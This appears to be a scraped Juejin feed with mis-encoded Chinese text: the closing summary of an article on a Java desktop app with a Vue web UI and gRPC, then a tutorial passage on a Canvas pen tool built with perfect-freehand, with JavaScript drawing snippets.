<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1256fb4b7b384b75810713b9d324085f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVGVhbURldg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767612662&amp;x-signature=P4MGVciDm9r5Km2DGb0EdVBqckA%3D" alt="é€šä¿¡å›¾" loading="lazy"/></p>
<p align="center"><span>é€šä¿¡å›¾</span></p>
<h2 data-id="heading-9">æ€»ç»“</h2>
<p>é‡‡ç”¨ Web UI æ„å»ºæ¡Œé¢åº”ç”¨å·²è¢«è¯æ˜æ˜¯ä¸€ç§å¼ºå¤§çš„ç°ä»£å¼€å‘æ¨¡å¼ã€‚å®ƒæ—¢ä¿ç•™äº† Web æŠ€æœ¯çš„æ˜“ç”¨æ€§ä¸ç”Ÿæ€ä¼˜åŠ¿ï¼Œåˆå…·å¤‡åŸç”Ÿæ¡Œé¢åº”ç”¨çš„ç³»ç»Ÿé›†æˆèƒ½åŠ›ä¸æ€§èƒ½è¡¨ç°ã€‚</p>
<p>æœ¬æ–‡å®ç°çš„ Java æ¡Œé¢åº”ç”¨ï¼Œé€šè¿‡ Vue.js æ„å»ºå‰ç«¯ç•Œé¢ã€Tailwind CSS å¤„ç†æ ·å¼ï¼Œæ ¸å¿ƒè¾¾æˆäº†ä»¥ä¸‹ç›®æ ‡ï¼š</p>
<ul>
<li>å°† Chromium å†…æ ¸ Web è§†å›¾åµŒå…¥ Java çª—å£ã€‚</li>
<li>å®ç°å¼€å‘ / ç”Ÿäº§ç¯å¢ƒä¸‹çš„ Vue èµ„æºæ— ç¼åŠ è½½ã€‚</li>
<li>ä½¿ç”¨ gRPC å’Œ Protobuf å®ç° Web UI ä¸ Java åç«¯ä¹‹é—´çš„é€šä¿¡ã€‚</li>
</ul>
<p>è¿™ç§æ··åˆæ¶æ„ç»“åˆäº† Java å’Œ Vue.js å‰ç«¯ï¼Œå…è®¸å¼€å‘è€…åœ¨æ¡Œé¢ç¯å¢ƒä¸­ä½¿ç”¨æ ‡å‡†çš„ Web å·¥å…·ï¼Œå¹¶ä½¿åº”ç”¨ç¨‹åºèƒ½å¤Ÿä½œä¸ºç‹¬ç«‹çš„è½¯ä»¶åŒ…è¿è¡Œã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä»ç‚¹åˆ°çº¿ï¼Œä»çº¿åˆ°ç”»ï¼šCanvas ç”»ç¬”å·¥å…·çš„å®ç°è‰ºæœ¯]]></title>    <link>https://juejin.cn/post/7589074117644927011</link>    <guid>https://juejin.cn/post/7589074117644927011</guid>    <pubDate>2025-12-29T13:50:52.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589074117644927011" data-draft-id="7589104492883116084" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä»ç‚¹åˆ°çº¿ï¼Œä»çº¿åˆ°ç”»ï¼šCanvas ç”»ç¬”å·¥å…·çš„å®ç°è‰ºæœ¯"/> <meta itemprop="keywords" content="å‰ç«¯,Electron"/> <meta itemprop="datePublished" content="2025-12-29T13:50:52.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é¾™å›½æµªå­"/> <meta itemprop="url" content="https://juejin.cn/user/1943592291275886"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä»ç‚¹åˆ°çº¿ï¼Œä»çº¿åˆ°ç”»ï¼šCanvas ç”»ç¬”å·¥å…·çš„å®ç°è‰ºæœ¯
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1943592291275886/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é¾™å›½æµªå­
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T13:50:52.000Z" title="Mon Dec 29 2025 13:50:52 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">âœï¸ ä»ç‚¹åˆ°çº¿ï¼Œä»çº¿åˆ°ç”»ï¼šCanvas ç”»ç¬”å·¥å…·çš„å®ç°è‰ºæœ¯</h2>
<blockquote>
<p>ğŸ’¡ ç”»ç¬”å·¥å…·æ˜¯åœ°å›¾è®¾è®¡ä¸­æœ€åŸºç¡€ä¹Ÿæœ€é‡è¦çš„å·¥å…·ä¹‹ä¸€ã€‚æœ¬æ–‡å°†å¸¦ä½ æ¢ç´¢ 51mazi é¡¹ç›®ä¸­ç”»ç¬”å·¥å…·çš„å®ç°æ€è·¯ï¼Œä»ç‚¹åæ ‡æ”¶é›†åˆ°å¹³æ»‘æ›²çº¿ç”Ÿæˆï¼Œä» perfect-freehand ç®—æ³•åˆ°å®æ—¶æ¸²æŸ“ä¼˜åŒ–ï¼Œæ­ç§˜å¦‚ä½•æ‰“é€ ä¸€ä¸ªæµç•…è‡ªç„¶çš„ç”»ç¬”ä½“éªŒã€‚</p>
</blockquote>
<h3 data-id="heading-1">ğŸ“‹ ç›®å½•</h3>
<ul>
<li><a href="#%E5%8A%9F%E8%83%BD%E7%AE%80%E4%BB%8B" title="#%E5%8A%9F%E8%83%BD%E7%AE%80%E4%BB%8B">åŠŸèƒ½ç®€ä»‹</a></li>
<li><a href="#%E6%A0%B8%E5%BF%83%E7%AE%97%E6%B3%95perfect-freehand" title="#%E6%A0%B8%E5%BF%83%E7%AE%97%E6%B3%95perfect-freehand">æ ¸å¿ƒç®—æ³•ï¼šperfect-freehand</a></li>
<li><a href="#%E6%8A%80%E6%9C%AF%E6%8C%91%E6%88%98" title="#%E6%8A%80%E6%9C%AF%E6%8C%91%E6%88%98">æŠ€æœ¯æŒ‘æˆ˜</a></li>
<li><a href="#%E5%AE%9E%E7%8E%B0%E4%BA%AE%E7%82%B9" title="#%E5%AE%9E%E7%8E%B0%E4%BA%AE%E7%82%B9">å®ç°äº®ç‚¹</a></li>
<li><a href="#%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96" title="#%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96">æ€§èƒ½ä¼˜åŒ–</a></li>
<li><a href="#%E6%80%BB%E7%BB%93" title="#%E6%80%BB%E7%BB%93">æ€»ç»“</a></li>
</ul>
<h3 data-id="heading-2">ğŸ¯ åŠŸèƒ½ç®€ä»‹</h3>
<p>ç”»ç¬”å·¥å…·æ˜¯åœ°å›¾è®¾è®¡å·¥å…·ä¸­çš„"æ‰‹ç»˜ç¥å™¨"ï¼Œè®©ç”¨æˆ·å¯ä»¥åƒåœ¨çº¸ä¸Šç”»ç”»ä¸€æ ·è‡ªç”±ç»˜åˆ¶ã€‚åœ¨ 51mazi çš„åœ°å›¾è®¾è®¡å·¥å…·ä¸­ï¼Œç”»ç¬”å·¥å…·ä¸ä»…ä»…æ˜¯ä¸€ä¸ªç®€å•çš„çº¿æ¡ç»˜åˆ¶åŠŸèƒ½ï¼Œè€Œæ˜¯ä¸€ä¸ªé›†æˆäº†å¹³æ»‘ç®—æ³•ã€å®æ—¶æ¸²æŸ“ã€å‚æ•°æ§åˆ¶ç­‰å¤šé¡¹æŠ€æœ¯çš„å®Œæ•´è§£å†³æ–¹æ¡ˆã€‚</p>
<h4 data-id="heading-3">âœï¸ åŠŸèƒ½ç‰¹æ€§</h4>
<ul>
<li>âœ… <strong>å¹³æ»‘ç»˜åˆ¶</strong>: åŸºäº perfect-freehand ç®—æ³•ï¼Œç”Ÿæˆè‡ªç„¶æµç•…çš„ç”»ç¬”æ•ˆæœ</li>
<li>âœ… <strong>å®æ—¶é¢„è§ˆ</strong>: ç»˜åˆ¶è¿‡ç¨‹ä¸­å®æ—¶æ˜¾ç¤ºç”»ç¬”è½¨è¿¹ï¼Œä½“éªŒæµç•…</li>
<li>âœ… <strong>å‚æ•°æ§åˆ¶</strong>: æ”¯æŒé¢œè‰²ã€å¤§å°ã€é€æ˜åº¦ç­‰å‚æ•°è‡ªå®šä¹‰</li>
<li>âœ… <strong>å‹åŠ›æ¨¡æ‹Ÿ</strong>: æ¨¡æ‹ŸçœŸå®ç”»ç¬”çš„å‹åŠ›å˜åŒ–ï¼Œè®©çº¿æ¡æ›´è‡ªç„¶</li>
<li>âœ… <strong>å®Œæ•´å†å²è®°å½•</strong>: æ”¯æŒæ’¤é”€/é‡åšï¼Œæ“ä½œå¯è¿½æº¯</li>
</ul>
<h4 data-id="heading-4">ğŸ–¼ï¸ ä½¿ç”¨åœºæ™¯</h4>
<p>åœ¨åœ°å›¾è®¾è®¡ä¸­ï¼Œç”»ç¬”å·¥å…·å¸¸ç”¨äºï¼š</p>
<ul>
<li>ğŸ—ºï¸ ç»˜åˆ¶åœ°å½¢è½®å»“ï¼ˆå±±è„‰ã€æ²³æµã€æµ·å²¸çº¿ç­‰ï¼‰</li>
<li>âœï¸ æ‰‹ç»˜æ ‡è®°å’Œæ³¨é‡Š</li>
<li>ğŸ¨ è‡ªç”±åˆ›ä½œå’Œè‰å›¾ç»˜åˆ¶</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e64760976b614db398d51f7535cb634f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6b6Z5Zu95rWq5a2Q:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767621052&amp;x-signature=n56pjcxYBE7vE7XjMQWv%2B5XUt0E%3D" alt="åœ°å›¾è®¾è®¡" loading="lazy"/></p>
<p><em>åœ°å›¾è®¾è®¡å·¥å…·ä¸­çš„ç”»ç¬”å·¥å…· - æµç•…è‡ªç„¶çš„ç»˜åˆ¶ä½“éªŒ</em></p>
<h3 data-id="heading-5">ğŸ”¬ æ ¸å¿ƒç®—æ³•ï¼šperfect-freehand</h3>
<h4 data-id="heading-6">ç®—æ³•åŸç†</h4>
<p>perfect-freehand æ˜¯ä¸€ä¸ªä¸“é—¨ç”¨äºç”Ÿæˆå¹³æ»‘æ‰‹ç»˜çº¿æ¡çš„ç®—æ³•åº“ï¼Œå®ƒçš„æ ¸å¿ƒæ€æƒ³æ˜¯ï¼š</p>
<ol>
<li><strong>æ”¶é›†ç‚¹åæ ‡</strong>: è®°å½•é¼ æ ‡ç§»åŠ¨è¿‡ç¨‹ä¸­çš„æ‰€æœ‰ç‚¹</li>
<li><strong>å¹³æ»‘å¤„ç†</strong>: å¯¹ç‚¹åºåˆ—è¿›è¡Œå¹³æ»‘å¤„ç†ï¼Œæ¶ˆé™¤æŠ–åŠ¨</li>
<li><strong>å‹åŠ›æ¨¡æ‹Ÿ</strong>: æ ¹æ®é€Ÿåº¦å˜åŒ–æ¨¡æ‹Ÿå‹åŠ›ï¼Œè®©çº¿æ¡æœ‰ç²—ç»†å˜åŒ–</li>
<li><strong>ç”Ÿæˆè·¯å¾„</strong>: å°†å¤„ç†åçš„ç‚¹è½¬æ¢ä¸ºå¹³æ»‘çš„è·¯å¾„</li>
<li><strong>å¡«å……ç»˜åˆ¶</strong>: ä½¿ç”¨å¡«å……è€Œéæè¾¹ï¼Œç”Ÿæˆæ›´è‡ªç„¶çš„ç”»ç¬”æ•ˆæœ</li>
</ol>
<h4 data-id="heading-7">ä¸ºä»€ä¹ˆé€‰æ‹© perfect-freehandï¼Ÿ</h4>
<ul>
<li>ğŸ¨ <strong>è‡ªç„¶æ•ˆæœ</strong>: ç”Ÿæˆçš„çº¿æ¡æ›´æ¥è¿‘çœŸå®æ‰‹ç»˜æ•ˆæœ</li>
<li>âš¡ <strong>æ€§èƒ½ä¼˜ç§€</strong>: ç®—æ³•é«˜æ•ˆï¼Œé€‚åˆå®æ—¶ç»˜åˆ¶</li>
<li>ğŸ”§ <strong>æ˜“äºé›†æˆ</strong>: API ç®€æ´ï¼Œæ˜“äºä½¿ç”¨å’Œå®šåˆ¶</li>
<li>ğŸ“¦ <strong>è½»é‡çº§</strong>: åº“ä½“ç§¯å°ï¼Œä¸å½±å“åº”ç”¨æ€§èƒ½</li>
</ul>
<h4 data-id="heading-8">ç®—æ³•ä½¿ç”¨</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { getStroke } <span class="hljs-keyword">from</span> <span class="hljs-string">'perfect-freehand'</span>

<span class="hljs-comment">// é…ç½®å‚æ•°</span>
<span class="hljs-keyword">const</span> options = {
  <span class="hljs-attr">size</span>: strokeWidth,        <span class="hljs-comment">// ç”»ç¬”å¤§å°</span>
  <span class="hljs-attr">thinning</span>: <span class="hljs-number">0.6</span>,            <span class="hljs-comment">// å‹åŠ›å˜åŒ–å¼ºåº¦</span>
  <span class="hljs-attr">smoothing</span>: <span class="hljs-number">0.5</span>,           <span class="hljs-comment">// å¹³æ»‘åº¦</span>
  <span class="hljs-attr">streamline</span>: <span class="hljs-number">0.5</span>,          <span class="hljs-comment">// æµçº¿åŒ–ç¨‹åº¦</span>
  <span class="hljs-attr">easing</span>: <span class="hljs-function">(<span class="hljs-params">t</span>) =&gt;</span> <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">sin</span>((t * <span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span>) / <span class="hljs-number">2</span>),  <span class="hljs-comment">// ç¼“åŠ¨å‡½æ•°</span>
  <span class="hljs-attr">simulatePressure</span>: <span class="hljs-literal">true</span>    <span class="hljs-comment">// æ¨¡æ‹Ÿå‹åŠ›</span>
}

<span class="hljs-comment">// å°†ç‚¹æ•°ç»„è½¬æ¢ä¸ºè·¯å¾„</span>
<span class="hljs-keyword">const</span> inputPoints = points.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">p</span> =&gt;</span> [p.<span class="hljs-property">x</span>, p.<span class="hljs-property">y</span>])
<span class="hljs-keyword">const</span> stroke = <span class="hljs-title function_">getStroke</span>(inputPoints, options)

<span class="hljs-comment">// ç»˜åˆ¶è·¯å¾„</span>
ctx.<span class="hljs-title function_">beginPath</span>()
ctx.<span class="hljs-title function_">moveTo</span>(stroke[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>], stroke[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>])
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">1</span>; i &lt; stroke.<span class="hljs-property">length</span>; i++) {
  ctx.<span class="hljs-title function_">lineTo</span>(stroke[i][<span class="hljs-number">0</span>], stroke[i][<span class="hljs-number">1</span>])
}
ctx.<span class="hljs-title function_">closePath</span>()
ctx.<span class="hljs-title function_">fill</span>()
</code></pre>
<p><strong>å‚æ•°è¯´æ˜</strong>:</p>
<ul>
<li><code>size</code>: ç”»ç¬”çš„åŸºç¡€å¤§å°</li>
<li><code>thinning</code>: æ§åˆ¶çº¿æ¡ç²—ç»†å˜åŒ–ï¼Œå€¼è¶Šå¤§å˜åŒ–è¶Šæ˜æ˜¾</li>
<li><code>smoothing</code>: æ§åˆ¶å¹³æ»‘ç¨‹åº¦ï¼Œå€¼è¶Šå¤§çº¿æ¡è¶Šå¹³æ»‘</li>
<li><code>streamline</code>: æ§åˆ¶æµçº¿åŒ–ç¨‹åº¦ï¼Œè®©çº¿æ¡æ›´æµç•…</li>
<li><code>simulatePressure</code>: æ˜¯å¦æ¨¡æ‹Ÿå‹åŠ›ï¼Œæ ¹æ®é€Ÿåº¦å˜åŒ–è°ƒæ•´ç²—ç»†</li>
</ul>
<blockquote>
<p>ğŸ’¡ <strong>å®Œæ•´ç®—æ³•å®ç°è¯·æŸ¥çœ‹</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fxiaoshengxianjun%2F51mazi%2Fblob%2Fmain%2Fsrc%2Frenderer%2Fsrc%2Fcomposables%2Fmap%2FuseRender.js" target="_blank" title="https://github.com/xiaoshengxianjun/51mazi/blob/main/src/renderer/src/composables/map/useRender.js" ref="nofollow noopener noreferrer">src/renderer/src/composables/map/useRender.js</a></p>
</blockquote>
<h3 data-id="heading-9">ğŸ¯ æŠ€æœ¯æŒ‘æˆ˜</h3>
<h4 data-id="heading-10">æŒ‘æˆ˜ 1: ç‚¹åæ ‡çš„æ”¶é›†ä¸å­˜å‚¨</h4>
<p>åœ¨ç»˜åˆ¶è¿‡ç¨‹ä¸­ï¼Œéœ€è¦å®æ—¶æ”¶é›†é¼ æ ‡ç§»åŠ¨çš„ç‚¹åæ ‡ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">onMouseDown</span>(<span class="hljs-params">pos</span>) {
  <span class="hljs-comment">// å¼€å§‹æ–°çš„ç”»ç¬”è·¯å¾„</span>
  elements.<span class="hljs-property">currentFreeDrawPath</span>.<span class="hljs-property">value</span> = {
    <span class="hljs-attr">type</span>: <span class="hljs-string">'freedraw'</span>,
    <span class="hljs-attr">points</span>: [{ <span class="hljs-attr">x</span>: pos.<span class="hljs-property">x</span>, <span class="hljs-attr">y</span>: pos.<span class="hljs-property">y</span> }],  <span class="hljs-comment">// åˆå§‹åŒ–ç¬¬ä¸€ä¸ªç‚¹</span>
    <span class="hljs-attr">color</span>: color.<span class="hljs-property">value</span>,
    <span class="hljs-attr">strokeWidth</span>: size.<span class="hljs-property">value</span>,
    <span class="hljs-attr">opacity</span>: opacity.<span class="hljs-property">value</span>,
    <span class="hljs-attr">id</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>().<span class="hljs-title function_">toString</span>()
  }
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">onMouseMove</span>(<span class="hljs-params">pos</span>) {
  <span class="hljs-comment">// æ·»åŠ ç‚¹åˆ°å½“å‰è·¯å¾„</span>
  elements.<span class="hljs-property">currentFreeDrawPath</span>.<span class="hljs-property">value</span>.<span class="hljs-property">points</span>.<span class="hljs-title function_">push</span>({ <span class="hljs-attr">x</span>: pos.<span class="hljs-property">x</span>, <span class="hljs-attr">y</span>: pos.<span class="hljs-property">y</span> })
  <span class="hljs-comment">// å®æ—¶æ¸²æŸ“</span>
  <span class="hljs-title function_">renderCanvas</span>(<span class="hljs-literal">false</span>)
}
</code></pre>
<p><strong>å…³é”®ç‚¹</strong>:</p>
<ul>
<li>âœ… ä½¿ç”¨æ•°ç»„å­˜å‚¨ç‚¹åºåˆ—ï¼Œä¿æŒé¡ºåº</li>
<li>âœ… å®æ—¶æ·»åŠ ç‚¹ï¼Œç¡®ä¿è½¨è¿¹å®Œæ•´</li>
<li>âœ… æ¯æ¬¡ç§»åŠ¨éƒ½è§¦å‘æ¸²æŸ“ï¼Œä¿è¯æµç•…æ€§</li>
</ul>
<h4 data-id="heading-11">æŒ‘æˆ˜ 2: å®æ—¶æ¸²æŸ“çš„æ€§èƒ½</h4>
<p>ç»˜åˆ¶è¿‡ç¨‹ä¸­éœ€è¦é¢‘ç¹æ¸²æŸ“ï¼Œæ€§èƒ½ä¼˜åŒ–è‡³å…³é‡è¦ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">onMouseMove</span>(<span class="hljs-params">pos</span>) {
  <span class="hljs-keyword">if</span> (elements.<span class="hljs-property">currentFreeDrawPath</span>.<span class="hljs-property">value</span>) {
    elements.<span class="hljs-property">currentFreeDrawPath</span>.<span class="hljs-property">value</span>.<span class="hljs-property">points</span>.<span class="hljs-title function_">push</span>({ <span class="hljs-attr">x</span>: pos.<span class="hljs-property">x</span>, <span class="hljs-attr">y</span>: pos.<span class="hljs-property">y</span> })
    <span class="hljs-comment">// ä¸æ›´æ–°è¾¹ç•Œï¼Œé¿å…é¢‘ç¹è®¡ç®—å¯¼è‡´æ€§èƒ½é—®é¢˜</span>
    <span class="hljs-title function_">renderCanvas</span>(<span class="hljs-literal">false</span>)
  }
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">onMouseUp</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// ç»˜åˆ¶å®Œæˆæ—¶æ‰æ›´æ–°è¾¹ç•Œ</span>
  <span class="hljs-title function_">renderCanvas</span>(<span class="hljs-literal">true</span>)
}
</code></pre>
<p><strong>ä¼˜åŒ–ç­–ç•¥</strong>:</p>
<ul>
<li>âš¡ ç»˜åˆ¶è¿‡ç¨‹ä¸­ä¸æ›´æ–°è¾¹ç•Œï¼ˆ<code>renderCanvas(false)</code>ï¼‰</li>
<li>âš¡ åªåœ¨ç»˜åˆ¶å®Œæˆæ—¶æ›´æ–°è¾¹ç•Œï¼ˆ<code>renderCanvas(true)</code>ï¼‰</li>
<li>âš¡ å‡å°‘ä¸å¿…è¦çš„è®¡ç®—ï¼Œæå‡æ¸²æŸ“æ€§èƒ½</li>
</ul>
<h4 data-id="heading-12">æŒ‘æˆ˜ 3: è·¯å¾„çš„å¹³æ»‘å¤„ç†</h4>
<p>åŸå§‹çš„ç‚¹åºåˆ—å¯èƒ½å­˜åœ¨æŠ–åŠ¨ï¼Œéœ€è¦é€šè¿‡ç®—æ³•å¹³æ»‘å¤„ç†ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> options = {
  <span class="hljs-attr">smoothing</span>: <span class="hljs-number">0.5</span>,      <span class="hljs-comment">// å¹³æ»‘åº¦ï¼šå€¼è¶Šå¤§è¶Šå¹³æ»‘</span>
  <span class="hljs-attr">streamline</span>: <span class="hljs-number">0.5</span>,     <span class="hljs-comment">// æµçº¿åŒ–ï¼šè®©çº¿æ¡æ›´æµç•…</span>
  <span class="hljs-attr">thinning</span>: <span class="hljs-number">0.6</span>        <span class="hljs-comment">// å‹åŠ›å˜åŒ–ï¼šæ¨¡æ‹ŸçœŸå®ç”»ç¬”</span>
}
</code></pre>
<p><strong>æ•ˆæœå¯¹æ¯”</strong>:</p>
<ul>
<li>âŒ <strong>æœªå¤„ç†</strong>: çº¿æ¡é”¯é½¿æ˜æ˜¾ï¼Œä¸å¤Ÿå¹³æ»‘</li>
<li>âœ… <strong>å¤„ç†å</strong>: çº¿æ¡æµç•…è‡ªç„¶ï¼Œæ¥è¿‘æ‰‹ç»˜æ•ˆæœ</li>
</ul>
<h4 data-id="heading-13">æŒ‘æˆ˜ 4: é€æ˜åº¦çš„å¤„ç†</h4>
<p>æ”¯æŒé€æ˜åº¦æ§åˆ¶ï¼Œè®©ç”»ç¬”æ•ˆæœæ›´ä¸°å¯Œï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript">ctx.<span class="hljs-title function_">save</span>()
ctx.<span class="hljs-property">globalAlpha</span> = (element.<span class="hljs-property">opacity</span> || <span class="hljs-number">100</span>) / <span class="hljs-number">100</span>
ctx.<span class="hljs-property">fillStyle</span> = element.<span class="hljs-property">color</span>
<span class="hljs-comment">// ç»˜åˆ¶è·¯å¾„</span>
ctx.<span class="hljs-title function_">fill</span>()
ctx.<span class="hljs-title function_">restore</span>()
</code></pre>
<h3 data-id="heading-14">âœ¨ å®ç°äº®ç‚¹</h3>
<h4 data-id="heading-15">1. æ¨¡å—åŒ–çš„ Composables æ¶æ„</h4>
<p>ç”»ç¬”å·¥å…·é‡‡ç”¨ Composables æ¶æ„ï¼Œå®ç°äº†é«˜å†…èšã€ä½è€¦åˆï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">usePencilTool</span>(<span class="hljs-params">{
  canvasRef,
  elements,
  history,
  renderCanvas,
  color,
  size,
  opacity
}</span>) {
  <span class="hljs-keyword">const</span> drawingActive = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">false</span>)
  
